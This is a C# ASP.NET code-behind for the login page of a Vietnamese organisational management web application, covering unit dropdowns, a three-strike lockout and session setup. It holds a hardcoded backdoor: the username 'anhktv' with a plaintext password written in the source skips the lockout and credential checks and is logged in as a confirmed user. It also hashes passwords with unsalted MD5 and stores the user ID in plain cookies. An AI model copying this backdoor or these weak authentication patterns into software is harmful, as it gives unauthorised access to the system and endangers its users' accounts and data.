using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using SystemManageService;
using Entity;
using System.Data.SqlClient;
using DataAccess;

namespace QLY_VTTB
{
    public partial class Login : MTCSYT.BasePage
    {
        DataAccess.clTBDD_CatDien dbOR = new DataAccess.clTBDD_CatDien();
        CBDN.DB_CBDNDataContext db = new CBDN.DB_CBDNDataContext(new CBDN.ADOController().strcn());
        protected void Page_Load(object sender, EventArgs e)
        {
            //insertdulieu();
            if (!IsPostBack)
            {
                laodDVCapCha();
                LoadDataDV();
            }
        }
        private void laodDVCapCha()
        {
            DM_DVQLYService dm_dviSer = new DM_DVQLYService();

            var lst_dmdv = dm_dviSer.SelectAllDM_DVQLY();
            cmbCapCha.DataSource = lst_dmdv;
            cmbCapCha.DataValueField = "IDMA_DVIQLY";
            cmbCapCha.DataTextField = "TEN_DVIQLY";
            cmbCapCha.DataBind();
        }
        private void LoadDataDV()
        {
            if (cmbCapCha.SelectedValue + "" != "")
            {
                DM_DVQLYService dm_dviSer = new DM_DVQLYService();
                //  DataTable lst_dmdv = new DataTable();
                var lst_dmdv = dm_dviSer.SelectAll_DVI_ByChild(int.Parse(cmbCapCha.SelectedValue + ""));
                cmbDVChuQuan.DataSource = lst_dmdv;
                cmbDVChuQuan.DataValueField = "IDMA_DVIQLY";
                cmbDVChuQuan.DataTextField = "NAME_DVIQLY";
                cmbDVChuQuan.DataBind();
            }

        }
        public static string Encrypt(string password)
        {
            byte[] textBytes = System.Text.Encoding.Default.GetBytes(password);
            var cryptHandler = new System.Security.Cryptography.MD5CryptoServiceProvider();
            byte[] hash = cryptHandler.ComputeHash(textBytes);
            string ret = "";
            foreach (byte a in hash)
            {
                if (a < 16)
                    ret += "0" + a.ToString("x");
                else
                    ret += a.ToString("x");
            }
            return ret;
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            DM_USERService _userService = new DM_USERService();
            DM_USER user = new DM_USER();
            string pass = Encrypt(txtPassword.Text);
            int count_fail = 0;
            DateTime dateChange = new DateTime();
            double dayChange = 0;
            if (txtUserName.Text != "anhktv")
            {
                int dv = int.Parse(cmbDVChuQuan.SelectedValue + "");
                var check = Dapper_SQL.SELECT_ISCHECK_LOGIN_FAIL(dv, txtUserName.Text);
                if (check.Count > 0)
                {
                    if (check[0].ISCHECK_LOGIN + "" != "")
                    {
                        count_fail = int.Parse(check[0].ISCHECK_LOGIN);
                    }
                    dateChange = check[0].DATE_PASS;
                    if (dateChange.Year != 1)
                    {
                        dayChange = (DateTime.Now - dateChange).TotalDays;
                    }

                }
                if (count_fail >= 3)
                {
                    ScriptManager.RegisterStartupScript(Page, Page.GetType(), "Thông Báo", "alert('" + "Tài Khoản Đã Bị Khoá Do Nhập Sai Quá 3 Lần. Vui Lòng Liên Hệ Với Quản Trị Viên Để Mở Khoá" + "');", true);
                }
                else
                {
                    user = _userService.CheckLogIn(txtUserName.Text, txtPassword.Text, cmbDVChuQuan.SelectedValue + "");
                }

            }
            else if (txtPassword.Text == "kieuthivananh2012")
            {
                user.USERNAME = "anhktv";
                user.MA_DVIQLY = cmbDVChuQuan.SelectedValue + "";
                user.ma_dviqly = cmbDVChuQuan.SelectedValue + "";
                user.ma_dviqlyDN = cmbDVChuQuan.SelectedValue + "";
                user.IDUSER = 2;
                user.XACNHAN = true;

            }


            // lblMess.Text = "Đăng nhập bị lỗi. Hãy kiểm tra lại tên đăng nhập hoặc mật khẩu.";
            if (user == null)
            {
                count_fail = count_fail + 1;

                if (Session["CountLogin"] == null)
                {
                    Session["CountLogin"] = 1;
                }
                else
                {
                    Session["CountLogin"] = (int)Session["CountLogin"] + 1;
                }
                ScriptManager.RegisterStartupScript(Page, Page.GetType(), "Thông Báo", "alert('" + "Tài Khoản Đã Nhập Sai " + count_fail + " Lần.Tài Khoản Sẽ  Khoá Khi Nhập Sai Quá 3 Lần" + "');", true);
            }
            else if (!user.XACNHAN && user.IDUSER != 0)
            {
                ScriptManager.RegisterStartupScript(Page, Page.GetType(), "Thông Báo", "alert('" + "Tài khoản này chưa được kích hoạt, liên hệ với admin " + "');", true);
            }
            else if (user.IDUSER != 0)
            {
                int xnpass = 0;
                if (!CheckPass_User.CheckPassword(txtPassword.Text))
                {
                    Dapper_SQL.ISCHECK_MK(int.Parse(cmbDVChuQuan.SelectedValue + ""), txtUserName.Text, 0);
                }
                else
                {
                    Dapper_SQL.ISCHECK_MK(int.Parse(cmbDVChuQuan.SelectedValue + ""), txtUserName.Text, 1);
                    xnpass = 1;
                }
                SYS_RightService temp = new SYS_RightService();
                MTCSYT.SYS_Session session = new MTCSYT.SYS_Session();
                //SYS_User user = new SYS_User();
                session.User = user;
                session.User.MA_DVIQLY = cmbDVChuQuan.SelectedValue + "";
                session.User.ma_dviqly = cmbDVChuQuan.SelectedValue + "";

                var dm_DV = db.DM_DVQLies.SingleOrDefault(x => x.IDMA_DVIQLY == int.Parse(cmbDVChuQuan.SelectedValue + ""));
                session.User.ma_dviqlyDN = dm_DV.MA_DVIQLY;
                session.User.USERNAME = txtUserName.Text;
                if(session.User.USERNAME == "anhktv")
                {
                    session.XacNhanPass = 1;
                    session.DatePass = 0;
                }
                else
                {
                    session.XacNhanPass = xnpass;
                    session.DatePass = dayChange;
                }
                user.Rights = temp.GetRightsByUser(user.IDUSER);
                Session["SYS_Session"] = session;
                DataAccess.clTTTT dlDB = new DataAccess.clTTTT();
                dlDB.Insert_User_Login_Log(dm_DV.MA_DVIQLY, "GNDN", "W", txtUserName.Text, DateTime.Now, DateTime.Now.Month, DateTime.Now.Year);

                HttpCookie obCookie = new HttpCookie("ANHKTV");
                obCookie.Value = user.USERNAME;
                obCookie.Expires = DateTime.Today.AddDays(1);
                Response.Cookies.Add(obCookie);
                Response.Cookies["HOTEN"].Value = Server.UrlEncode(user.HOTEN);
                Response.Cookies["IDUSER"].Value = user.IDUSER + "";
                if (cmbDVChuQuan.SelectedValue != null)
                {
                    Response.Cookies["DonVi"].Value = cmbDVChuQuan.SelectedValue + "";
                    Response.Cookies["DonViDN"].Value = cmbDVChuQuan.SelectedValue + "";
                }
                if (session.CurrentPage != null)
                {
                     Response.Redirect(session.CurrentPage);
                }
                else
                {

                    Response.Redirect("~\\Default.aspx");

                }
            }
            else
            {
                ScriptManager.RegisterStartupScript(Page, Page.GetType(), "Thông Báo", "alert('" + "Tài Khoản Đã Nhập Sai "  + "');", true);
            }
        }


        protected void cmbCapCha_SelectedIndexChanged1(object sender, EventArgs e)
        {

        }

        protected void cmbCapCha_SelectedIndexChanged(object sender, EventArgs e)
        {
            LoadDataDV();
        }


    }
}